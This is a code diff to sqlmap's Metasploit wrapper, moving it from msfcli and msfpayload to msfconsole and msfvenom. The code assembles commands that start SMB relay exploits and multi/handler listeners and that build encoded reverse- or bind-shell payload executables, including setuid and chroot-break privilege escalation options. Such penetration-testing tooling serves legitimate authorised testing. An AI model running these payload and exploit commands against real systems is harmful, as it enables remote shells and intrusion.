@@ -24,6 +24,7 @@ from lib.core.common import randomRange
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.data import conf
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import DBMS
@@ -61,8 +62,10 @@ class Metasploit:
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP() or conf.hostname
         self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
+        self._msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
         self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
         self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
+        self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom"))
 
         if IS_WIN:
             _ = conf.msfPath
@@ -76,8 +79,10 @@ class Metasploit:
                     if _ == old:
                         break
             self._msfCli = "%s & ruby %s" % (_, self._msfCli)
+            self._msfConsole = "%s & ruby %s" % (_, self._msfConsole)
             self._msfEncode = "ruby %s" % self._msfEncode
             self._msfPayload = "%s & ruby %s" % (_, self._msfPayload)
+            self._msfVenom = "%s & ruby %s" % (_, self._msfVenom)
 
         self._msfPayloadsList = {
                                       "windows": {
@@ -326,42 +331,80 @@ class Metasploit:
         self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)
 
     def _forgeMsfCliCmd(self, exitfunc="process"):
-        self._cliCmd = "%s multi/handler PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
-        self._cliCmd += " EXITFUNC=%s" % exitfunc
-        self._cliCmd += " LPORT=%s" % self.portStr
+        if kb.oldMsf:
+            self._cliCmd = "%s multi/handler PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
+            self._cliCmd += " EXITFUNC=%s" % exitfunc
+            self._cliCmd += " LPORT=%s" % self.portStr
 
-        if self.connectionStr.startswith("bind"):
-            self._cliCmd += " RHOST=%s" % self.rhostStr
-        elif self.connectionStr.startswith("reverse"):
-            self._cliCmd += " LHOST=%s" % self.lhostStr
+            if self.connectionStr.startswith("bind"):
+                self._cliCmd += " RHOST=%s" % self.rhostStr
+            elif self.connectionStr.startswith("reverse"):
+                self._cliCmd += " LHOST=%s" % self.lhostStr
+            else:
+                raise SqlmapDataException("unexpected connection type")
+
+            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
+                self._cliCmd += " DisableCourtesyShell=true"
+
+            self._cliCmd += " E"
         else:
-            raise SqlmapDataException("unexpected connection type")
+            self._cliCmd = "%s -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd += "; set EXITFUNC %s" % exitfunc
+            self._cliCmd += "; set LPORT %s" % self.portStr
 
-        if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
-            self._cliCmd += " DisableCourtesyShell=true"
+            if self.connectionStr.startswith("bind"):
+                self._cliCmd += "; set RHOST %s" % self.rhostStr
+            elif self.connectionStr.startswith("reverse"):
+                self._cliCmd += "; set LHOST %s" % self.lhostStr
+            else:
+                raise SqlmapDataException("unexpected connection type")
 
-        self._cliCmd += " E"
+            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
+                self._cliCmd += "; set DisableCourtesyShell true"
+
+            self._cliCmd += "; exploit'"
 
     def _forgeMsfCliCmdForSmbrelay(self):
         self._prepareIngredients(encode=False)
 
-        self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
-        self._cliCmd += " EXITFUNC=thread"
-        self._cliCmd += " LPORT=%s" % self.portStr
-        self._cliCmd += " SRVHOST=%s" % self.lhostStr
-        self._cliCmd += " SRVPORT=%s" % self._selectSMBPort()
+        if kb.oldMsf:
+            self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
+            self._cliCmd += " EXITFUNC=thread"
+            self._cliCmd += " LPORT=%s" % self.portStr
+            self._cliCmd += " SRVHOST=%s" % self.lhostStr
+            self._cliCmd += " SRVPORT=%s" % self._selectSMBPort()
 
-        if self.connectionStr.startswith("bind"):
-            self._cliCmd += " RHOST=%s" % self.rhostStr
-        elif self.connectionStr.startswith("reverse"):
-            self._cliCmd += " LHOST=%s" % self.lhostStr
+            if self.connectionStr.startswith("bind"):
+                self._cliCmd += " RHOST=%s" % self.rhostStr
+            elif self.connectionStr.startswith("reverse"):
+                self._cliCmd += " LHOST=%s" % self.lhostStr
+            else:
+                raise SqlmapDataException("unexpected connection type")
+
+            self._cliCmd += " E"
         else:
-            raise SqlmapDataException("unexpected connection type")
+            self._cliCmd = "%s -x 'use windows/smb/smb_relay; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd += "; set EXITFUNC thread"
+            self._cliCmd += "; set LPORT %s" % self.portStr
+            self._cliCmd += "; set SRVHOST %s" % self.lhostStr
+            self._cliCmd += "; set SRVPORT %s" % self._selectSMBPort()
 
-        self._cliCmd += " E"
+            if self.connectionStr.startswith("bind"):
+                self._cliCmd += "; set RHOST %s" % self.rhostStr
+            elif self.connectionStr.startswith("reverse"):
+                self._cliCmd += "; set LHOST %s" % self.lhostStr
+            else:
+                raise SqlmapDataException("unexpected connection type")
+
+            self._cliCmd += "; exploit'"
 
     def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
-        self._payloadCmd = "%s %s" % (self._msfPayload, self.payloadConnStr)
+        if kb.oldMsf:
+            self._payloadCmd = self._msfPayload
+        else:
+            self._payloadCmd = "%s -p" % self._msfVenom
+
+        self._payloadCmd += " %s" % self.payloadConnStr
         self._payloadCmd += " EXITFUNC=%s" % exitfunc
         self._payloadCmd += " LPORT=%s" % self.portStr
 
@@ -373,13 +416,22 @@ class Metasploit:
         if Backend.isOs(OS.LINUX) and conf.privEsc:
             self._payloadCmd += " PrependChrootBreak=true PrependSetuid=true"
 
-        if extra == "BufferRegister=EAX":
-            self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
+        if kb.oldMsf:
+            if extra == "BufferRegister=EAX":
+                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
 
-            if extra is not None:
-                self._payloadCmd += " %s" % extra
+                if extra is not None:
+                    self._payloadCmd += " %s" % extra
+            else:
+                self._payloadCmd += " X > \"%s\"" % outFile
         else:
-            self._payloadCmd += " X > \"%s\"" % outFile
+            if extra == "BufferRegister=EAX":
+                self._payloadCmd += " -a x86 -e %s -f %s > \"%s\"" % (self.encoderStr, format, outFile)
+
+                if extra is not None:
+                    self._payloadCmd += " %s" % extra
+            else:
+                self._payloadCmd += " -f exe > \"%s\"" % outFile
 
     def _runMsfCliSmbrelay(self):
         self._forgeMsfCliCmdForSmbrelay()
